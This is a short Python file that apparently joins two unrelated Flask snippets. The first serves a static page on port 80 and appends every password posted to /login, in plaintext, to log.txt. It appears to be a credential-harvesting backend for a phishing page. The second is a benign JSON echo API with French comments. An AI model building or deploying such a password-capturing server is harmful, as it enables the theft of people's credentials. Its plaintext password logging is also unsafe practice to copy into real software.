from flask import Flask, request, redirect, url_for

app = Flask(__name__, static_folder='.')

@app.route('/')
def index():
    return redirect(url_for('static', filename='index.html'))

@app.route('/login', methods=['POST'])
def login():
    password = request.form['password']
    with open('log.txt', 'a') as log_file:
        log_file.write(f'Password: {password}\n')
    return 'Password received'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
    
    
    
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/data', methods=['POST'])
def handle_post():
    # Vérifier si le corps de la requête est en JSON
    if request.is_json:
        # Récupérer les données JSON envoyées dans la requête
        data = request.get_json()
        
        # Traiter les données (par exemple, afficher dans la console)
        print(data)
        
        # Retourner une réponse JSON
        return jsonify({"message": "Données reçues", "data": data}), 200
    else:
        # Si ce n'est pas du JSON, renvoyer une erreur
        return jsonify({"error": "Requête non valide. Attendu du JSON."}), 400

if __name__ == '__main__':
    app.run(debug=True)